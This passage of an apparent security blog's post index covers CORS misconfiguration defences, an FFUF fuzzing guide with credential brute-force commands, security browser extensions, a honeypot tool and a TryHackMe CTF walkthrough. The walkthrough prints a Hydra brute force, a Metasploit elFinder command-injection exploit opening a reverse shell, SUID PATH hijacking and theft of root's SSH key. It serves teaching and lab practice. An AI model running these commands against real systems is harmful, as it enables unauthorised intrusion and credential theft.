/reader?url=doc1.pdfHost: intranet.normal-website.comOrigin: https://external-site.comResponseHTTP/1.1 200 OKAccess-Control-Allow-Origin: *Key Observations  Unrestricted Access (Access-Control-Allow-Origin: *):          The server responds with Access-Control-Allow-Origin: *, allowing any origin to access the resource.      Since no credentials are required (Access-Control-Allow-Credentials is absent), the attacker cannot retrieve sensitive data tied to the user’s session (e.g., cookies or tokens).        Internal Network Context:          The target (intranet.normal-website.com) is part of the organization’s internal network and is not directly accessible from the public internet.      Attackers cannot browse to this site directly but can exploit CORS misconfigurations to probe or interact with it indirectly.        Potential for Exploitation:          Even without credentials, attackers can use CORS to access unauthenticated content hosted on the intranet.      For example, they might retrieve sensitive documents, configuration files, or other resources that are publicly accessible within the private network.      Why This Matters  Lower Security Standards for Internal Sites:          Internal websites are often less rigorously secured than external-facing applications. Developers may assume that these sites are safe because they are hidden behind a firewall or NAT.      Misconfigured CORS policies on internal sites can expose them to attacks from compromised machines within the network or through malicious external actors exploiting vulnerabilities like SSRF (Server-Side Request Forgery).        Access to Unauthenticated Content:          While unauthenticated content may seem harmless, it can still contain sensitive information such as internal documentation, API endpoints, or debugging tools.      Attackers can use this information to escalate their privileges or pivot to other parts of the network.        Exploiting Trust Relationships:          Many organizations trust their internal systems implicitly, even when those systems are poorly secured.      A misconfigured CORS policy on an internal site can allow attackers to bypass network segmentation and access resources they should not be able to reach.      Mitigation Strategies  Restrict Access-Control-Allow-Origin:          Avoid using Access-Control-Allow-Origin: * unless absolutely necessary. Instead, explicitly whitelist trusted origins.        Disable CORS for Sensitive Endpoints:          For internal APIs or resources that do not need to be accessed cross-origin, disable CORS entirely.        Implement Network Segmentation:          Ensure that internal websites are properly isolated from external networks and that only authorized users and systems can access them.        Regular Security Audits:          Regularly audit internal systems for vulnerabilities, including CORS misconfigurations, to prevent attackers from exploiting them.      Preventing CORS-Based AttacksCORS vulnerabilities primarily arise due to misconfigurations in how cross-origin requests are handled. As such, preventing these attacks is largely a matter of proper configuration. Below are some effective strategies to defend against CORS-based attacks.1. Proper Configuration of Cross-Origin RequestsIf a web resource contains sensitive information, the Access-Control-Allow-Origin header should be carefully and explicitly configured. Avoid overly permissive settings that could expose your application to unnecessary risks.Key Recommendations:      Specify Trusted Origins Explicitly:    Only allow trusted origins in the Access-Control-Allow-Origin header. For example:    Access-Control-Allow-Origin: https://trusted-domain.com        This ensures that only requests from explicitly trusted domains are permitted.        Avoid Dynamically Reflecting Origins Without Validation:    Dynamically reflecting the value of the Origin header (e.g., copying it directly into the Access-Control-Allow-Origin response) without proper validation is highly exploitable. Always validate the origin against a whitelist of trusted domains before allowing access.  2. Only Allow Trusted SitesThis may seem obvious, but it bears repeating: only trusted sites should be specified in the Access-Control-Allow-Origin header. Misconfigured or overly permissive CORS policies can lead to serious security vulnerabilities.Why It Matters:  Allowing untrusted origins can enable attackers to bypass the same-origin policy and access sensitive resources.  For example, an attacker could exploit a misconfigured CORS policy to steal private data or perform unauthorized actions on behalf of a user.3. Avoid Whitelisting nullAvoid using the following header:Access-Control-Allow-Origin: nullWhy It’s Dangerous:  The null origin can be specified in certain edge cases, such as:          Requests from internal documents (e.g., file:// URLs).      Sandboxed iframes with restricted permissions.        Allowing null as a valid origin can inadvertently grant access to malicious actors who craft requests with this origin.Best Practice:  Define CORS headers with respect to explicitly trusted origins for both private and public servers. Never use null as a valid origin unless absolutely necessary, and even then, ensure strict validation.4. Avoid Wildcards in Internal NetworksAvoid using wildcards (*) in internal networks. While wildcards may seem convenient, they can introduce significant risks, especially in environments where sensitive data is stored.Why It’s Dangerous:  Using Access-Control-Allow-Origin: * allows any website to access your resources, which is particularly risky for internal APIs or services.  Trusting network configuration alone (e.g., firewalls or NAT) to protect internal resources is insufficient. If an internal browser accesses an untrusted external domain, it could expose sensitive data to attackers.Best Practice:      Explicitly whitelist trusted origins, even for internal services. For example:    Access-Control-Allow-Origin: https://internal-service.trusted-domain.com      5. CORS Is Not a Substitute for Server-Side Security PoliciesIt’s crucial to understand that CORS is not a replacement for server-side security measures. CORS defines browser behavior but does not inherently protect sensitive data on the server.Why It Matters:  An attacker can directly forge requests from trusted origins, bypassing CORS entirely. For example, tools like curl or Postman can send requests without adhering to CORS restrictions.  Therefore, sensitive data must always be protected using additional server-side mechanisms, such as:          Authentication: Ensure that only authorized users can access sensitive resources.      Session Management: Use secure session tokens and enforce proper session expiration policies.      Input Validation: Validate all inputs to prevent injection attacks and other vulnerabilities.      Summary of Key Points  Explicitly Specify Trusted Origins:          Avoid dynamically reflecting origins or using wildcards (*) in the Access-Control-Allow-Origin header.        Avoid Whitelisting null:          The null origin can be exploited in edge cases, so it should never be used as a valid origin.        Secure Internal Networks:          Even in internal networks, avoid wildcards and explicitly whitelist trusted origins to prevent unauthorized access.        Combine CORS with Server-Side Protections:          CORS is not a substitute for server-side security. Always implement authentication, session management, and input validation to protect sensitive data.      "
  },
  
  {
    "title": "FFUF: Fuzzing Guide to Web Applications",
    "url": "/posts/ffuf-Fuzzing-Guide",
    "categories": "Tools, FFUF Fuzzing Guide",
    "tags": "Tools, FFUF",
    "date": "2025-02-15 00:00:00 +0000",
    





    
    "snippet": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuz...",
    "content": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuzzing. This guide will provide an in-depth explanation of FFUF commands, their use cases, and advanced techniques to help you leverage its full potential.Table of Contents  Installation  Basic Commands  Advanced Features  Output Options  Custom WordlistsInstallationTo install FFUF on your system, follow the instructions below:Debian/Ubuntu Based Systemssudo apt update &amp;&amp; sudo apt install ffufmacOS (Using Homebrew)brew install ffufOther Operating SystemsFor other operating systems, download the binary from the official GitHub repository:GitHub - ffuf: Fast web fuzzer written in GoOnce downloaded, extract the binary and add it to your system’s PATH.Basic CommandsDirectory and File Brute ForceOne of the most common uses of FFUF is finding hidden directories and files on a web server. Use the -u flag to specify the target URL and the -w flag to provide a wordlist.ffuf -u https://example.com/FUZZ -w wordlist.txtExplanation:  FUZZ: A placeholder that FFUF replaces with words from the wordlist.  wordlist.txt: A text file containing potential directory or file names.POST Request with WordlistTo fuzz POST requests, use the -X POST flag.ffuf -w wordlist.txt -u https://website.com/FUZZ -X POSTThis command sends POST requests while fuzzing the URL path.Case Insensitive MatchingUse the -ic flag for case-insensitive matching, which is useful when unsure about server case sensitivity.ffuf -u https://example.com/FUZZ -w wordlist.txt -ic -cThe -c flag adds color-coded output for better readability.File Extension FuzzingTo search for files with specific extensions, use the -e flag.ffuf -u https://example.com/indexFUZZ -w wordlist.txt -e .php,.asp,.bak,.dbThis command appends extensions like .php, .asp, .bak, and .db to each word in the wordlist.Recursive FuzzingFor multi-level directory fuzzing, use the -recursion flag.ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3This scans up to three levels deep, helping uncover deeply nested directories.Advanced FeaturesFiltering ResponsesFilter responses based on HTTP status codes or response sizes.ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404,500This excludes responses with status codes 404 or 500.Multi Wordlist FuzzingFuzz multiple parameters using separate wordlists.ffuf -u https://example.com/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2Here, W1 and W2 are placeholders replaced by words from dict.txt and dns_dict.txt, respectively.Subdomain and Virtual Host FuzzingSubdomain FuzzingDiscover hidden subdomains by replacing the FUZZ keyword in the target URL.ffuf -w subdomains.txt -u https://FUZZ.example.com/Virtual Host (VHost) FuzzingFuzz the Host header to detect virtual hosts.ffuf -w vhosts.txt -u https://example.com/ -H \"Host: FUZZ.example.com\"Fuzzing HTTP ParametersGET Parameter FuzzingFind potential GET parameters by fuzzing the query string.ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=valuePOST Parameter FuzzingTest APIs or login forms by fuzzing POST data.ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'Login Bypass TestingBrute force login systems by fuzzing the password parameter.ffuf -w passwordlist.txt -X POST -d \"username=admin&amp;password=FUZZ\" -u https://www.example.com/loginPUT Request FuzzingTest unauthorized file uploads or modifications.ffuf -w /path/to/wordlist.txt -X PUT -u https://target.com/FUZZ -b 'session=abcdef'Advanced FFUF TechniquesClusterbomb ModeCombine multiple wordlists for comprehensive testing.ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZThis tests every combination of usernames and passwords.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode clusterbombPitchfork ModePair corresponding entries from two wordlists for controlled brute force testing.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode pitchforkSetting CookiesInclude cookies in your requests for authenticated fuzzing.ffuf -b \"SESSIONID=abcd1234; USER=admin\" -w wordlist.txt -u https://example.com/FUZZUsing ProxiesRoute FFUF requests through a proxy like Burp Suite for deeper analysis.ffuf -x http://127.0.0.1:8080 -w wordlist.txt -u https://example.com/FUZZCustom Header FuzzingFuzz custom headers to identify vulnerabilities.ffuf -w headers.txt -u https://example.com/ -H \"X-Custom-Header: FUZZ\"Fuzzing with Custom User-AgentModify the User-Agent header to mimic specific browsers.ffuf -u \"https://example.com/FUZZ\" -w wordlist.txt -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"Rate Limiting BypassControl the request rate to avoid triggering rate limiting defenses.ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 50 -t 50Output OptionsSave results in various formats for further analysis.HTML Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.html -of htmlJSON Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of jsonCSV Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.csv -of csvSave all output formats at once:ffuf -w wordlist.txt -u https://example.com/FUZZ -o results -of allCustom Wordlists with PayloadsAccess the wordlists with payloads here:  SecLists  PayloadsAllTheThings and PayloadsAllTheThings Website  PayloadBox"
  },
  
  {
    "title": "Browser Extensions for Cybersecurity",
    "url": "/posts/browser-extensions-cybersecurity",
    "categories": "Tools, Browser Extensions",
    "tags": "Tools, Browser Extensions",
    "date": "2025-02-13 00:00:00 +0000",
    





    
    "snippet": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gath...",
    "content": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gathering intelligence, and improving your workflow. From detecting exposed credentials to managing proxies and analyzing metadata.Reconnaissance &amp; Information Gathering1. Wappalyzer — Technology DetectorWhy It’s Useful: Identifies the technology stack of websites, including frameworks, CMS, and server details.Link: Wappalyzer - Chrome Web Store2. Shodan — Website Intelligence ToolWhy It’s Useful: Provides information on website hosting, server locations, and open ports.Link: Shodan - Chrome Web Store3. Mitaka — OSINT Search ToolWhy It’s Useful: Searches IPs, domains, URLs, and hashes across multiple threat intelligence platforms.Link: Mitaka - Chrome Web Store4. Vortimo OSINT ToolWhy It’s Useful: A versatile tool for bookmarking, scraping, and analyzing web pages during OSINT investigations.Link: Vortimo OSINT Tool - Chrome Web Store5. Hunter.io — Finding Emails on WebsitesWhy It’s Useful: Extracts publicly available emails from websites for security reporting and OSINT investigations.Link: Hunter - Chrome Web Store6. WaybackURL — Fetch Archived URLsWhy It’s Useful: Retrieves all URLs from the Wayback Machine to identify past versions of web pages.Link: Wayback Machine - Chrome Web Store7. Traduzir Paginas Web — Webpage TranslatorWhy It’s Useful: Translates entire web pages into different languages for analyzing foreign websites.Link: Google Translate - Chrome Web Store8. EXIF Viewer Pro — Extract Image MetadataWhy It’s Useful: Retrieves metadata from images directly on a webpage for forensic analysis and OSINT investigations.Link: EXIF Viewer Pro - Chrome Web StoreTesting &amp; Exploitation9. HackTools — Payload GeneratorWhy It’s Useful: Provides pre-built payloads for SQLi, XSS, and other attacks to save time during manual testing.Link: Hack-Tools - Chrome Web Store10. EditThisCookie — Advanced Cookie EditorWhy It’s Useful: Allows modification, deletion, and analysis of cookies, including checking HTTPOnly and Secure flags.Link: EditThisCookie - Chrome Web Store11. D3coder — Encode/Decode ToolWhy It’s Useful: Encodes and decodes various text formats like Base64, URL encoding, and Unix timestamps.Link: D3coder - Chrome Web Store12. EndPointer — Find Sensitive URLsWhy It’s Useful: Extracts and analyzes URLs for potential security endpoints during penetration testing.Link: EndPointer - Chrome Web Store13. Link Gopher — Extract All LinksWhy It’s Useful: Fetches all links from a webpage for reconnaissance purposes.Link: Link Gopher - Chrome Web Store14. FindSomething — Hidden Parameter FinderWhy It’s Useful: Scans source code and JavaScript files for interesting patterns and hidden data, such as API keys.Link: FindSomething - Chrome Web Store15. .git Finder — Information DisclosureWhy It’s Useful: Detects exposed .git directories that may lead to source code leaks.Link: .git Finder - Chrome Web Store16. S3BucketList — AWS Bucket FinderWhy It’s Useful: Searches for publicly accessible AWS S3 buckets to detect misconfigured cloud storage.Link: S3BucketList - Chrome Web StoreAutomation &amp; Efficiency17. FoxyProxy — Proxy Management for Burp SuiteWhy It’s Useful: Simplifies proxy management for intercepting web traffic with tools like Burp Suite or OWASP ZAP.Link: FoxyProxy - Chrome Web Store18. Open Multiple URLs — Bulk URL OpenerWhy It’s Useful: Opens multiple links simultaneously, saving time during bug hunting.Link: Open Multiple URLs - Chrome Web Store19. YesWeHack VDP FinderWhy It’s Useful: Detects vulnerability disclosure programs (VDP) of visited websites for responsible reporting.Link: YesWeHack VDP Finder - Chrome Web Store20. SponsorBlock — Skip YouTube SponsorsWhy It’s Useful: Skips sponsored segments, intros, and outros on YouTube videos to save time.Link: SponsorBlock - Chrome Web StorePrivacy &amp; Security21. uBlock Origin — Ad and Tracker BlockerWhy It’s Useful: Blocks ads, trackers, and malicious scripts to improve privacy and security.Link: uBlock Origin - Chrome Web Store22. WebRTC Protect — Protect IP LeakWhy It’s Useful: Disables WebRTC to prevent IP address leakage, ensuring anonymity while browsing.Link: WebRTC Protect - Chrome Web Store23. Temp-Mail — Disposable Email ServiceWhy It’s Useful: Provides temporary email addresses to avoid spam and protect your personal information.Link: Temp Mail - Chrome Web Store24. Dark Reader — Eye ProtectionWhy It’s Useful: Provides a dark mode for all websites to reduce eye strain during late-night sessions.Link: Dark Reader - Chrome Web Store"
  },
  
  {
    "title": "THM: Lookup",
    "url": "/posts/ctf-redteam-lookup",
    "categories": "CTF, Red Team",
    "tags": "CTF, Red Team",
    "date": "2025-02-12 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover hidden resources.  Hydra: For brute-forcing login credentials.  Metasploit: For exploiting the elFinder command injection vulnerability.  Python: For spawning an interactive shell.  Linpeas: For automating enumeration and identifying privilege escalation vectors.Resources Used:  GTFOBins: A repository of Unix binaries that can be exploited for privilege escalation.  SecLists: A collection of wordlists used for brute-forcing credentials with Hydra.  Exploit DB: An alternative resource for finding exploits, such as the one used for elFinder.Step 1: Scanning the Target NetworkWe begin by scanning the target machine 10.10.41.18 using Nmap to identify open ports and services.Command:nmap 10.10.41.18 -sV -sCOutput:Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 ISTNmap scan report for lookup.thm (10.10.41.18)Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Observations:  Port 22 (SSH): Running OpenSSH 8.2p1.  Port 80 (HTTP): Running Apache HTTP Server 2.4.41.Step 2: Discovering Subdomains with GobusterTo find any hidden subdomains or directories, we use Gobuster:Command:gobuster dns -d lookup.thm -w /usr/share/wordlists/dirb/common.txtOutput:===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     lookup.thm[+] Method:                  DNS[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Timeout:                 10s===============================================================2025/01/05 18:00:00 Starting gobuster in DNS subdomain enumeration mode===============================================================files.lookup.thm (Status: FOUND)...Key Concept:  Gobuster: A tool for discovering subdomains, directories, and files on a web server. In this case, we used it to uncover the files.lookup.thm subdomain.Step 3: Adding Target to Hosts FileFor easier navigation, we add the target’s IP to the /etc/hosts file.Commands:echo \"10.10.41.18 lookup.thm\" | sudo tee -a /etc/hostsecho \"10.10.41.18 files.lookup.thm\" | sudo tee -a /etc/hostsStep 4: Navigating to the Web ApplicationAfter updating the hosts file, we open the web application in a browser. The login page appears.Attempting Default Credentials:We attempt to log in with common default credentials but are met with a “wrong password” message and a 3-second delay before redirection.Key Concept:  Brute Force Protection: The delay is likely implemented to prevent brute-force attacks.Step 5: Brute Forcing Login Using HydraSince default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.Command:hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=try again\"Output:[80][http-post-form] host: lookup.thm   login: jose   password: password123Key Concept:  Hydra: A powerful tool for brute-forcing login forms. It automates the process of trying multiple username-password combinations.Step 6: Logging InUsing the discovered credentials (jose:password123), we log into the system. After logging in, we are redirected to the files.lookup.thm domain.Step 7: Exploring the credential.txt FileUpon opening the credential.txt file, we find some credentials that might be for SSH. However, attempting to use these credentials fails:Command:ssh think@10.10.41.18Output:think@10.10.41.18's password:Permission denied, please try again.Step 8: Identifying VulnerabilitiesWhile interacting with the system, we discover a vulnerable web application called elFinder running on the target machine.Version Discovery:By inspecting the web interface, we determine the version of elFinder (2.1.47).Searching for Exploits:We search for exploits related to this version in Metasploit and Exploit DB:Commands:msfconsole -qsearch elfinder 2.1.47Output:Matching Modules================    #  Name                                                               Disclosure Date  Rank       Check  Description   -  ----                                                                ---------------  ----       -----  -----------   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command InjectionKey Concept:  Metasploit: A framework for developing and executing exploit code against remote targets.  Exploit DB: A database of public exploits and shellcode. You could have searched for the vulnerability here as well.Step 9: Exploiting the elFinder VulnerabilityWe select and configure the exploit module for elFinder:Commands:use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injectionset LHOST tun0set RHOST files.lookup.thmrunOutput:[*] Started reverse TCP handler on 10.17.14.127:4444 [*] Uploading payload 'TRNyzgLuCE.jpg;echo ...' (1975 bytes)[*] Triggering vulnerability via image rotation ...[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...[*] Sending stage (40004 bytes) to 10.10.41.18[+] Deleted .7mrFCOx.php[*] Meterpreter session 1 opened (10.17.14.127:4444 -&gt; 10.10.41.18:35566)Key Concept:  Command Injection: The vulnerability allows us to inject commands into the application, which are then executed by the server.Step 10: Spawning a ShellOnce inside the system, we have a limited shell as the www-data user. To make it more interactive, we spawn a proper shell using Python:Command:python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Key Concept:  PTY Shell: A pseudo-terminal provides a fully interactive shell, allowing us to execute complex commands and navigate the system effectively.At this point, we could have used linpeas to automate the enumeration process and check for every privilege escalation possibility:Steps:  Upload linpeas.sh to the target machine.  Execute it with the following command:    ./linpeas.sh        Linpeas would have highlighted potential privilege escalation vectors, such as misconfigured SUID binaries or weak file permissions.Step 11: Privilege EscalationAs the www-data user, we check for potential privilege escalation opportunities.Checking SUID Binaries:We search for binaries with the SUID bit set:Command:find / -perm /4000 2&gt;/dev/nullOutput:/usr/sbin/pwmKey Concept:  SUID Bit: Files with the SUID bit set allow users to execute them with the file owner’s privileges.Exploiting the pwm Binary:We manipulate the PATH variable to exploit the pwm binary:Commands:export PATH=/tmp:$PATHecho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' &gt; /tmp/idchmod +x /tmp/id/usr/sbin/pwmThis changes the user to think.Step 12: SSH Brute-ForcingWe perform an SSH brute-force attack using Hydra to gain access as the think user:Command:hydra -l think -P wordlist.txt ssh://lookup.thmOutput:think:josemario.AKA(think)Logging In:ssh think@lookup.thmRetrieving User Flag:cat /home/think/user.txt{REDACTED}Step 13: Privilege Escalation to RootAs the think user, we check for sudo privileges:Command:sudo -lOutput:User think may run the following commands on lookup:(ALL) /usr/bin/lookExploiting the look Command:Using GTFOBins, we find a method to read sensitive files with the look command:Command:LFILE=/root/.ssh/id_rsasudo look '' \"$LFILE\"This grants us the root user’s private SSH key.Logging In as Root:ssh -i /tmp/id_rsa root@lookup.thmRetrieving Root Flag:cat /root/root.txt{REDACTED}"
  },
  
  {
    "title": "Honeypot Suite",
    "url": "/posts/python-honeypot-suite",
    "categories": "Python, Honeypot Suite",
    "tags": "Python, Honeypot Suite",
    "date": "2025-02-09 00:00:00 +0000",
    





    
    "snippet": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup,...",
    "content": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup, maintenance, and contribution.Honeypot Suite Repository  Link: Honeypot Suite RepositoryDirectory StructureThe repository follows a modular structure for clarity and extensibility:honeypot-suite/├── https_honeypot.py       # HTTPS honeypot implementation├── dns_honeypot.py         # DNS honeypot implementation├── ssh_honeypot.py         # SSH honeypot implementation├── ftp_honeypot.py         # FTP honeypot implementation├── postgresql_honeypot.py  # PostgreSQL honeypot implementation├── menu.py                 # Centralized GUI for managing honeypots└──  README.md               # Project documentationFeaturesThe honeypot suite is designed to simulate various network services, allowing you to monitor and analyze malicious activities. Key features include:  Multi-Protocol Support: Supports HTTPS, DNS, SSH, FTP, and PostgreSQL protocols.  Dynamic Configuration: Allows users to configure host, port, and protocol-specific settings via a GUI or command-line interface.  Real-Time Logging: Logs all interactions with the honeypot in real-time, providing detailed insights into attacker behavior.  Customizable Responses: Each honeypot can be configured to respond with custom data (e.g., fake IP addresses for DNS, dummy responses for SSH).  Self-Signed Certificates: Automatically generates SSL/TLS certificates for HTTPS and SSH honeypots.  Cross-Platform Compatibility: Works on Windows, macOS, and Linux.How It WorksThe honeypot suite operates by mimicking vulnerable network services to attract attackers and log their interactions. Here’s an overview of how it works:  Service Simulation:          Each honeypot module simulates a specific protocol (e.g., DNS, SSH) and listens for incoming connections.      The honeypot responds to queries or login attempts with predefined or dynamically generated data.        Logging:          All interactions are logged to files (e.g., dns_honeypot.log, ssh_honeypot.log) for later analysis.      Logs include details such as source IP, port, query type, username/password attempts, and more.        GUI Management:          A professional GUI (menu.py) allows users to select, configure, and manage honeypots easily.      Start/stop buttons ensure seamless control over each service.        Termination:          Closing the Python program stops the honeypot service.      Ensure proper termination using tips provided below.      Code StructureThe honeypot suite is modular and extensible, with each protocol implemented as a separate Python script. Below is the high-level structure:  Honeypot Modules:          Each protocol has its own script (e.g., https_honeypot.py, dns_honeypot.py).      Scripts expose start_honeypot and stop_honeypot functions for integration.        Centralized Control:          The menu.py script provides a unified interface for managing all honeypots.      Dynamically loads modules based on user selection.        Twisted Framework:          Built using Twisted, a powerful event-driven networking engine for Python.      Ensures efficient handling of network traffic and logging.        Cryptography Library:          Uses the cryptography library to generate self-signed certificates for HTTPS and SSH.      InterfaceMenuThe menu.py script provides a clean and intuitive GUI for selecting and configuring honeypots:Steps to Use the Menu:  Select a protocol (e.g., DNS, SSH).  Configure settings such as host, port, and additional parameters (e.g., SSH version).  Click “Start Honeypot” to begin monitoring.  View logs in real-time within the GUI.LimitationsWhile the honeypot suite is robust, it has some limitations:  Resource Consumption: Running multiple honeypots simultaneously may consume significant system resources.  False Positives: Legitimate users interacting with the honeypot may generate logs that need filtering.  Single Process Reactor: Only one Twisted reactor can run at a time, limiting simultaneous honeypot execution without subprocesses.  Basic Simulations: The honeypots provide basic simulations and may not fully replicate complex production environments.Future EnhancementsPlanned enhancements include:  Advanced Logging: Integrate with centralized logging systems like Elasticsearch or Splunk for better analysis.  Machine Learning: Use ML models to detect and classify attack patterns automatically.  Containerization: Package each honeypot in Docker containers for easier deployment and isolation.  Web-Based Interface: Replace the Tkinter GUI with a web-based dashboard for remote management.  Automated Alerts: Send email or SMS alerts when suspicious activity is detected.Ethical ConsiderationsUsing honeypots for cybersecurity research must adhere to ethical guidelines:  Authorization: Deploy honeypots only in environments where you have explicit permission.  Data Privacy: Avoid logging sensitive information from legitimate users.  Legal Compliance: Ensure compliance with local laws and regulations regarding data collection and monitoring.  Isolation: Run honeypots in isolated networks to prevent unintended exposure.Tips and TricksEnsuring Proper TerminationTo ensure the honeypot stops cleanly:  Graceful Shutdown:          Press Ctrl+C in the terminal running the honeypot.      Verify termination using tools like netstat or tasklist.        Example:    netstat -ano | findstr :&lt;port&gt;taskkill /PID &lt;PID&gt; /F        Check Logs:          Review the log file (e.g., dns_honeypot.log) to confirm the honeypot stopped successfully.      Setting Up the HTTPS Honeypot  Download Resources:          Specify a target URL (e.g., https://example.com) to download and serve content.      The honeypot inlines CSS, JavaScript, and images to reduce external dependencies.        Generate Certificates:          Customize SSL certificate details (e.g., country, organization) during startup.      Certificates are stored locally in the script directory.        Run the Honeypot:          Execute the script with desired configurations:        python https_honeypot.py --host 0.0.0.0 --port 443 --url https://example.com                      Test Locally:          Use tools like curl or Postman to test the honeypot:        curl -k https://127.0.0.1/                    Extra InsightsWhy Use Honeypots?Honeypots are invaluable tools for:  Gathering intelligence on attacker techniques and tools.  Detecting and mitigating threats in real-time.  Educating teams about security risks through practical demonstrations.Best Practices  Regular Updates: Keep the honeypot scripts updated to handle new attack vectors.  Controlled Environment: Deploy honeypots in sandboxed or virtualized environments to minimize risks.  Analyze Logs: Regularly review logs to identify trends and improve your security posture.Example OutputBelow is an example log entry from the DNS honeypot:[2023-10-15 12:34:56] DNS Query Received - Query Name: example.com, Type: A, Class: IN, From: ('192.168.1.100', 5353)From the SSH honeypot:[2023-10-15 12:35:00] Login attempt - Username: admin, Password: password123ConclusionThis honeypot suite is a tool for cybersecurity researchers. By simulating vulnerable services, it helps you understand attacker behavior and strengthen your defenses. While the current implementation focuses on simplicity and usability, future enhancements will expand its capabilities and make it even more effective."
  },
  
  {
    "title": "Network Scanner",
    "url": "/posts/python-network-scanner",
    "categories": "Python, Network Scanner",
    "tags": "Python, Network Scanner",
    "date": "2025-02-07 00:00:00 +0000",
    





    
    "snippet": "Network scanning tool designed for cybersecurity. It offers features such as port scanning, service detection, OS fingerprinting, vulnerability scanning, traceroute, geolocation, WHOIS lookup, and ...",
    "content": "Network scanning tool designed for cybersecurity. It offers features such as port scanning, service detection, OS fingerprinting, vulnerability scanning, traceroute, geolocation, WHOIS lookup, and SSL/TLS checks. By querying external databases like Shodan, NVD, and CIRCL, the tool identifies potential vulnerabilities and generates detailed HTML reports summarizing scan results.Network Scanner Repository  Link: Network Scanner RepositoryFeatures  Port Scanning: Scan both TCP and UDP ports to identify open, closed, or filtered ports.  Service Detection: Detect service versions running on open ports.  OS Fingerprinting: Perform advanced OS fingerprinting to guess the operating system of the target.  Vulnerability Scanning: Query external databases (Shodan, NVD, CIRCL) to identify potential vulnerabilities.  Traceroute: Perform a traceroute to the target IP to identify the network path.  Geolocation: Determine the geographical location of the target IP using the GeoIP database.  WHOIS Lookup: Retrieve WHOIS information for the target domain or IP.  SSL/TLS Check: Check SSL/TLS configurations for HTTPS services.  NSLookup: Perform DNS resolution to convert IP addresses to domain names and vice versa.  HTML Report Generation: Generate a detailed HTML report summarizing the scan results.  Website Vulnerability Check: Query CVE Details for known vulnerabilities associated with the target domain.How It WorksThe program starts by displaying a banner and prompting the user for a target IP address and a port range. It then proceeds to scan the specified ports using TCP or UDP protocols. For each open port, the program attempts to detect the service version and suggest potential vulnerabilities. It also performs additional tasks like OS fingerprinting, traceroute, geolocation, WHOIS lookup, and SSL/TLS checks. Finally, it compiles all the gathered information into an HTML report.Code StructureThe code is structured into several functions, each responsible for a specific task:  scan_tcp_port: Scans a TCP port and determines if it is open, closed, or filtered.  scan_udp_port: Scans a UDP port and determines if it is open, closed, or filtered.  nslookup: Performs DNS resolution for the target IP or domain.  query_website_vulnerabilities: Queries CVE Details for known vulnerabilities associated with the target domain.  generate_html_report: Generates an HTML report summarizing the scan results.  detect_service_version: Detects the service version running on an open port.  suggest_exploits: Suggests potential exploits for the detected service.  os_fingerprinting: Performs OS fingerprinting to guess the operating system of the target.  query_shodan: Queries Shodan for information about the target IP.  query_nvd: Queries the National Vulnerability Database (NVD) for known vulnerabilities.  query_circl: Queries CIRCL for potential vulnerabilities.  query_exploit_db: Queries Exploit-DB for potential exploits.  vulnerability_scan: Performs a vulnerability scan using external APIs.  traceroute: Performs a traceroute to the target IP.  geolocation: Determines the geographical location of the target IP.  whois_lookup: Performs a WHOIS lookup for the target domain or IP.  ssl_tls_check: Checks SSL/TLS configurations for HTTPS services.  start_scan: Orchestrates the entire scanning process.InterfaceCommand-Line InterfaceHTML Report Template InterfaceLimitations  Rate Limiting: The program may be rate-limited by external APIs like Shodan, NVD, and CIRCL.  Accuracy: OS fingerprinting and service detection may not always be accurate.  GeoIP Database: The program requires a local GeoIP database for geolocation. If the database is not present, geolocation will not work.  SSL/TLS Check: The SSL/TLS check is limited to port 443 (HTTPS).  Vulnerability Scanning: The 